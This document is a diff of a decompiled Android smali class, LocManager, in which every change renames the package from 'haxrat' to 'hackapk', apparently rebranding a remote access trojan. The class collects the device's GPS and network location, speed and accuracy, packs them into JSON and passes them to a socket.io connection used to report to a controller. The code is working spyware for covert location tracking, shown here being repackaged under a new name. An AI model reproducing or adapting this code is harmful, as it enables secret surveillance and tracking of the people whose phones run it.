@@ -1,4 +1,4 @@
-.class public Lcom/hax4us/haxrat/LocManager;
+.class public Lcom/justhack/hackapk/LocManager;
 .super Ljava/lang/Object;
 .source "LocManager.java"
 
@@ -52,19 +52,19 @@
 
     const/4 v3, 0x0
 
-    iput-boolean v3, v2, Lcom/hax4us/haxrat/LocManager;->isGPSEnabled:Z
+    iput-boolean v3, v2, Lcom/justhack/hackapk/LocManager;->isGPSEnabled:Z
 
     move-object v2, v0
 
     const/4 v3, 0x0
 
-    iput-boolean v3, v2, Lcom/hax4us/haxrat/LocManager;->isNetworkEnabled:Z
+    iput-boolean v3, v2, Lcom/justhack/hackapk/LocManager;->isNetworkEnabled:Z
 
     move-object v2, v0
 
     const/4 v3, 0x0
 
-    iput-boolean v3, v2, Lcom/hax4us/haxrat/LocManager;->canGetLocation:Z
+    iput-boolean v3, v2, Lcom/justhack/hackapk/LocManager;->canGetLocation:Z
 
     .line 42
     move-object v2, v0
@@ -73,7 +73,7 @@
 
     check-cast v3, Landroid/content/Context;
 
-    iput-object v3, v2, Lcom/hax4us/haxrat/LocManager;->mContext:Landroid/content/Context;
+    iput-object v3, v2, Lcom/justhack/hackapk/LocManager;->mContext:Landroid/content/Context;
 
     return-void
 .end method
@@ -95,31 +95,31 @@
 
     const/4 v4, 0x0
 
-    iput-boolean v4, v3, Lcom/hax4us/haxrat/LocManager;->isGPSEnabled:Z
+    iput-boolean v4, v3, Lcom/justhack/hackapk/LocManager;->isGPSEnabled:Z
 
     move-object v3, v0
 
     const/4 v4, 0x0
 
-    iput-boolean v4, v3, Lcom/hax4us/haxrat/LocManager;->isNetworkEnabled:Z
+    iput-boolean v4, v3, Lcom/justhack/hackapk/LocManager;->isNetworkEnabled:Z
 
     move-object v3, v0
 
     const/4 v4, 0x0
 
-    iput-boolean v4, v3, Lcom/hax4us/haxrat/LocManager;->canGetLocation:Z
+    iput-boolean v4, v3, Lcom/justhack/hackapk/LocManager;->canGetLocation:Z
 
     .line 47
     move-object v3, v0
 
     move-object v4, v1
 
-    iput-object v4, v3, Lcom/hax4us/haxrat/LocManager;->mContext:Landroid/content/Context;
+    iput-object v4, v3, Lcom/justhack/hackapk/LocManager;->mContext:Landroid/content/Context;
 
     .line 48
     move-object v3, v0
 
-    invoke-virtual {v3}, Lcom/hax4us/haxrat/LocManager;->getLocation()Landroid/location/Location;
+    invoke-virtual {v3}, Lcom/justhack/hackapk/LocManager;->getLocation()Landroid/location/Location;
 
     move-result-object v3
 
@@ -137,7 +137,7 @@
 
     move-object v2, v0
 
-    iget-boolean v2, v2, Lcom/hax4us/haxrat/LocManager;->canGetLocation:Z
+    iget-boolean v2, v2, Lcom/justhack/hackapk/LocManager;->canGetLocation:Z
 
     move v0, v2
 
@@ -166,7 +166,7 @@
     .line 112
     move-object v5, v0
 
-    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;
+    iget-object v5, v5, Lcom/justhack/hackapk/LocManager;->location:Landroid/location/Location;
 
     if-eqz v5, :cond_0
 
@@ -189,7 +189,7 @@
 
     move-object v7, v0
 
-    iget-wide v7, v7, Lcom/hax4us/haxrat/LocManager;->latitude:D
+    iget-wide v7, v7, Lcom/justhack/hackapk/LocManager;->latitude:D
 
     invoke-virtual {v5, v6, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;
 
@@ -202,7 +202,7 @@
 
     move-object v7, v0
 
-    iget-wide v7, v7, Lcom/hax4us/haxrat/LocManager;->longitude:D
+    iget-wide v7, v7, Lcom/justhack/hackapk/LocManager;->longitude:D
 
     invoke-virtual {v5, v6, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;
 
@@ -215,7 +215,7 @@
 
     move-object v7, v0
 
-    iget-wide v7, v7, Lcom/hax4us/haxrat/LocManager;->altitude:D
+    iget-wide v7, v7, Lcom/justhack/hackapk/LocManager;->altitude:D
 
     invoke-virtual {v5, v6, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;
 
@@ -228,7 +228,7 @@
 
     move-object v7, v0
 
-    iget v7, v7, Lcom/hax4us/haxrat/LocManager;->accuracy:F
+    iget v7, v7, Lcom/justhack/hackapk/LocManager;->accuracy:F
 
     float-to-double v7, v7
 
@@ -243,7 +243,7 @@
 
     move-object v7, v0
 
-    iget v7, v7, Lcom/hax4us/haxrat/LocManager;->speed:F
+    iget v7, v7, Lcom/justhack/hackapk/LocManager;->speed:F
 
     float-to-double v7, v7
 
@@ -296,7 +296,7 @@
     move-object v5, v0
 
     :try_start_0
-    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->mContext:Landroid/content/Context;
+    iget-object v5, v5, Lcom/justhack/hackapk/LocManager;->mContext:Landroid/content/Context;
 
     const-string v6, "location"
 
@@ -306,14 +306,14 @@
 
     check-cast v5, Landroid/location/LocationManager;
 
-    iput-object v5, v4, Lcom/hax4us/haxrat/LocManager;->locationManager:Landroid/location/LocationManager;
+    iput-object v5, v4, Lcom/justhack/hackapk/LocManager;->locationManager:Landroid/location/LocationManager;
 
     .line 56
     move-object v4, v0
 
     move-object v5, v0
 
-    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->locationManager:Landroid/location/LocationManager;
+    iget-object v5, v5, Lcom/justhack/hackapk/LocManager;->locationManager:Landroid/location/LocationManager;
 
     const-string v6, "gps"
 
@@ -321,14 +321,14 @@
 
     move-result v5
 
-    iput-boolean v5, v4, Lcom/hax4us/haxrat/LocManager;->isGPSEnabled:Z
+    iput-boolean v5, v4, Lcom/justhack/hackapk/LocManager;->isGPSEnabled:Z
 
     .line 58
     move-object v4, v0
 
     move-object v5, v0
 
-    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->locationManager:Landroid/location/LocationManager;
+    iget-object v5, v5, Lcom/justhack/hackapk/LocManager;->locationManager:Landroid/location/LocationManager;
 
     const-string v6, "network"
 
@@ -336,18 +336,18 @@
 
     move-result v5
 
-    iput-boolean v5, v4, Lcom/hax4us/haxrat/LocManager;->isNetworkEnabled:Z
+    iput-boolean v5, v4, Lcom/justhack/hackapk/LocManager;->isNetworkEnabled:Z
 
     .line 60
     move-object v4, v0
 
-    iget-boolean v4, v4, Lcom/hax4us/haxrat/LocManager;->isGPSEnabled:Z
+    iget-boolean v4, v4, Lcom/justhack/hackapk/LocManager;->isGPSEnabled:Z
 
     if-nez v4, :cond_0
 
     move-object v4, v0
 
-    iget-boolean v4, v4, Lcom/hax4us/haxrat/LocManager;->isNetworkEnabled:Z
+    iget-boolean v4, v4, Lcom/justhack/hackapk/LocManager;->isNetworkEnabled:Z
 
     if-eqz v4, :cond_2
 
@@ -357,10 +357,10 @@
 
     const/4 v5, 0x1
 
-    iput-boolean v5, v4, Lcom/hax4us/haxrat/LocManager;->canGetLocation:Z
+    iput-boolean v5, v4, Lcom/justhack/hackapk/LocManager;->canGetLocation:Z
 
     .line 63
-    sget-object v4, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;
+    sget-object v4, Lcom/justhack/hackapk/ConnectionManager;->context:Landroid/content/Context;
 
     invoke-virtual {v4}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;
 
@@ -368,7 +368,7 @@
 
     const-string v5, "android.permission.ACCESS_FINE_LOCATION"
 
-    sget-object v6, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;
+    sget-object v6, Lcom/justhack/hackapk/ConnectionManager;->context:Landroid/content/Context;
 
     invoke-virtual {v6}, Landroid/content/Context;->getPackageName()Ljava/lang/String;
 
@@ -382,7 +382,7 @@
 
     if-ne v4, v5, :cond_2
 
-    sget-object v4, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;
+    sget-object v4, Lcom/justhack/hackapk/ConnectionManager;->context:Landroid/content/Context;
 
     invoke-virtual {v4}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;
 
@@ -390,7 +390,7 @@
 
     const-string v5, "android.permission.ACCESS_COARSE_LOCATION"
 
-    sget-object v6, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;
+    sget-object v6, Lcom/justhack/hackapk/ConnectionManager;->context:Landroid/content/Context;
 
     invoke-virtual {v6}, Landroid/content/Context;->getPackageName()Ljava/lang/String;
 
@@ -407,14 +407,14 @@
     .line 66
     move-object v4, v0
 
-    iget-boolean v4, v4, Lcom/hax4us/haxrat/LocManager;->isNetworkEnabled:Z
+    iget-boolean v4, v4, Lcom/justhack/hackapk/LocManager;->isNetworkEnabled:Z
 
     if-eqz v4, :cond_1
 
     .line 68
     move-object v4, v0
 
-    iget-object v4, v4, Lcom/hax4us/haxrat/LocManager;->locationManager:Landroid/location/LocationManager;
+    iget-object v4, v4, Lcom/justhack/hackapk/LocManager;->locationManager:Landroid/location/LocationManager;
 
     if-eqz v4, :cond_1
 
@@ -423,7 +423,7 @@
 
     move-object v5, v0
 
-    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->locationManager:Landroid/location/LocationManager;
+    iget-object v5, v5, Lcom/justhack/hackapk/LocManager;->locationManager:Landroid/location/LocationManager;
 
     const-string v6, "network"
 
@@ -431,12 +431,12 @@
 
     move-result-object v5
 
-    iput-object v5, v4, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;
+    iput-object v5, v4, Lcom/justhack/hackapk/LocManager;->location:Landroid/location/Location;
 
     .line 70
     move-object v4, v0
 
-    iget-object v4, v4, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;
+    iget-object v4, v4, Lcom/justhack/hackapk/LocManager;->location:Landroid/location/Location;
 
     if-eqz v4, :cond_1
 
@@ -445,85 +445,85 @@
 
     move-object v5, v0
 
-    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;
+    iget-object v5, v5, Lcom/justhack/hackapk/LocManager;->location:Landroid/location/Location;
 
     invoke-virtual {v5}, Landroid/location/Location;->getLatitude()D
 
     move-result-wide v5
 
-    iput-wide v5, v4, Lcom/hax4us/haxrat/LocManager;->latitude:D
+    iput-wide v5, v4, Lcom/justhack/hackapk/LocManager;->latitude:D
 
     .line 72
     move-object v4, v0
 
     move-object v5, v0
 
-    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;
+    iget-object v5, v5, Lcom/justhack/hackapk/LocManager;->location:Landroid/location/Location;
 
     invoke-virtual {v5}, Landroid/location/Location;->getLongitude()D
 
     move-result-wide v5
 
-    iput-wide v5, v4, Lcom/hax4us/haxrat/LocManager;->longitude:D
+    iput-wide v5, v4, Lcom/justhack/hackapk/LocManager;->longitude:D
 
     .line 73
     move-object v4, v0
 
     move-object v5, v0
 
-    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;
+    iget-object v5, v5, Lcom/justhack/hackapk/LocManager;->location:Landroid/location/Location;
 
     invoke-virtual {v5}, Landroid/location/Location;->getAltitude()D
 
     move-result-wide v5
 
-    iput-wide v5, v4, Lcom/hax4us/haxrat/LocManager;->altitude:D
+    iput-wide v5, v4, Lcom/justhack/hackapk/LocManager;->altitude:D
 
     .line 74
     move-object v4, v0
 
     move-object v5, v0
 
-    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;
+    iget-object v5, v5, Lcom/justhack/hackapk/LocManager;->location:Landroid/location/Location;
 
     invoke-virtual {v5}, Landroid/location/Location;->getAccuracy()F
 
     move-result v5
 
-    iput v5, v4, Lcom/hax4us/haxrat/LocManager;->accuracy:F
+    iput v5, v4, Lcom/justhack/hackapk/LocManager;->accuracy:F
 
     .line 75
     move-object v4, v0
 
     move-object v5, v0
 
-    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;
+    iget-object v5, v5, Lcom/justhack/hackapk/LocManager;->location:Landroid/location/Location;
 
     invoke-virtual {v5}, Landroid/location/Location;->getSpeed()F
 
     move-result v5
 
-    iput v5, v4, Lcom/hax4us/haxrat/LocManager;->speed:F
+    iput v5, v4, Lcom/justhack/hackapk/LocManager;->speed:F
 
     .line 81
     :cond_1
     move-object v4, v0
 
-    iget-boolean v4, v4, Lcom/hax4us/haxrat/LocManager;->isGPSEnabled:Z
+    iget-boolean v4, v4, Lcom/justhack/hackapk/LocManager;->isGPSEnabled:Z
 
     if-eqz v4, :cond_2
 
     .line 82
     move-object v4, v0
 
-    iget-object v4, v4, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;
+    iget-object v4, v4, Lcom/justhack/hackapk/LocManager;->location:Landroid/location/Location;
 
     if-nez v4, :cond_2
 
     .line 84
     move-object v4, v0
 
-    iget-object v4, v4, Lcom/hax4us/haxrat/LocManager;->locationManager:Landroid/location/LocationManager;
+    iget-object v4, v4, Lcom/justhack/hackapk/LocManager;->locationManager:Landroid/location/LocationManager;
 
     if-eqz v4, :cond_2
 
@@ -532,7 +532,7 @@
 
     move-object v5, v0
 
-    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->locationManager:Landroid/location/LocationManager;
+    iget-object v5, v5, Lcom/justhack/hackapk/LocManager;->locationManager:Landroid/location/LocationManager;
 
     const-string v6, "gps"
 
@@ -540,12 +540,12 @@
 
     move-result-object v5
 
-    iput-object v5, v4, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;
+    iput-object v5, v4, Lcom/justhack/hackapk/LocManager;->location:Landroid/location/Location;
 
     .line 86
     move-object v4, v0
 
-    iget-object v4, v4, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;
+    iget-object v4, v4, Lcom/justhack/hackapk/LocManager;->location:Landroid/location/Location;
 
     if-eqz v4, :cond_2
 
@@ -554,65 +554,65 @@
 
     move-object v5, v0
 
-    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;
+    iget-object v5, v5, Lcom/justhack/hackapk/LocManager;->location:Landroid/location/Location;
 
     invoke-virtual {v5}, Landroid/location/Location;->getLatitude()D
 
     move-result-wide v5
 
-    iput-wide v5, v4, Lcom/hax4us/haxrat/LocManager;->latitude:D
+    iput-wide v5, v4, Lcom/justhack/hackapk/LocManager;->latitude:D
 
     .line 88
     move-object v4, v0
 
     move-object v5, v0
 
-    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;
+    iget-object v5, v5, Lcom/justhack/hackapk/LocManager;->location:Landroid/location/Location;
 
     invoke-virtual {v5}, Landroid/location/Location;->getLongitude()D
 
     move-result-wide v5
 
-    iput-wide v5, v4, Lcom/hax4us/haxrat/LocManager;->longitude:D
+    iput-wide v5, v4, Lcom/justhack/hackapk/LocManager;->longitude:D
 
     .line 89
     move-object v4, v0
 
     move-object v5, v0
 
-    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;
+    iget-object v5, v5, Lcom/justhack/hackapk/LocManager;->location:Landroid/location/Location;
 
     invoke-virtual {v5}, Landroid/location/Location;->getAltitude()D
 
     move-result-wide v5
 
-    iput-wide v5, v4, Lcom/hax4us/haxrat/LocManager;->altitude:D
+    iput-wide v5, v4, Lcom/justhack/hackapk/LocManager;->altitude:D
 
     .line 90
     move-object v4, v0
 
     move-object v5, v0
 
-    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;
+    iget-object v5, v5, Lcom/justhack/hackapk/LocManager;->location:Landroid/location/Location;
 
     invoke-virtual {v5}, Landroid/location/Location;->getAccuracy()F
 
     move-result v5
 
-    iput v5, v4, Lcom/hax4us/haxrat/LocManager;->accuracy:F
+    iput v5, v4, Lcom/justhack/hackapk/LocManager;->accuracy:F
 
     .line 91
     move-object v4, v0
 
     move-object v5, v0
 
-    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;
+    iget-object v5, v5, Lcom/justhack/hackapk/LocManager;->location:Landroid/location/Location;
 
     invoke-virtual {v5}, Landroid/location/Location;->getSpeed()F
 
     move-result v5
 
-    iput v5, v4, Lcom/hax4us/haxrat/LocManager;->speed:F
+    iput v5, v4, Lcom/justhack/hackapk/LocManager;->speed:F
     :try_end_0
     .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
 
@@ -621,7 +621,7 @@
     :goto_0
     move-object v4, v0
 
-    iget-object v4, v4, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;
+    iget-object v4, v4, Lcom/justhack/hackapk/LocManager;->location:Landroid/location/Location;
 
     move-object v0, v4
 
@@ -673,7 +673,7 @@
 
     move-result-wide v4
 
-    iput-wide v4, v3, Lcom/hax4us/haxrat/LocManager;->latitude:D
+    iput-wide v4, v3, Lcom/justhack/hackapk/LocManager;->latitude:D
 
     .line 130
     move-object v3, v0
@@ -684,7 +684,7 @@
 
     move-result-wide v4
 
-    iput-wide v4, v3, Lcom/hax4us/haxrat/LocManager;->longitude:D
+    iput-wide v4, v3, Lcom/justhack/hackapk/LocManager;->longitude:D
 
     .line 131
     move-object v3, v0
@@ -695,7 +695,7 @@
 
     move-result-wide v4
 
-    iput-wide v4, v3, Lcom/hax4us/haxrat/LocManager;->altitude:D
+    iput-wide v4, v3, Lcom/justhack/hackapk/LocManager;->altitude:D
 
     .line 132
     move-object v3, v0
@@ -706,7 +706,7 @@
 
     move-result v4
 
-    iput v4, v3, Lcom/hax4us/haxrat/LocManager;->accuracy:F
+    iput v4, v3, Lcom/justhack/hackapk/LocManager;->accuracy:F
 
     .line 133
     move-object v3, v0
@@ -717,15 +717,15 @@
 
     move-result v4
 
-    iput v4, v3, Lcom/hax4us/haxrat/LocManager;->speed:F
+    iput v4, v3, Lcom/justhack/hackapk/LocManager;->speed:F
 
     .line 135
     :cond_0
-    invoke-static {}, Lcom/hax4us/haxrat/IOSocket;->getInstance()Lcom/hax4us/haxrat/IOSocket;
+    invoke-static {}, Lcom/justhack/hackapk/IOSocket;->getInstance()Lcom/justhack/hackapk/IOSocket;
 
     move-result-object v3
 
-    invoke-virtual {v3}, Lcom/hax4us/haxrat/IOSocket;->getIoSocket()Lio/socket/client/Socket;
+    invoke-virtual {v3}, Lcom/justhack/hackapk/IOSocket;->getIoSocket()Lio/socket/client/Socket;
 
     move-result-object v3
 
@@ -745,7 +745,7 @@
 
     move-object v8, v0
 
-    invoke-virtual {v8}, Lcom/hax4us/haxrat/LocManager;->getData()Lorg/json/JSONObject;
+    invoke-virtual {v8}, Lcom/justhack/hackapk/LocManager;->getData()Lorg/json/JSONObject;
 
     move-result-object v8
 
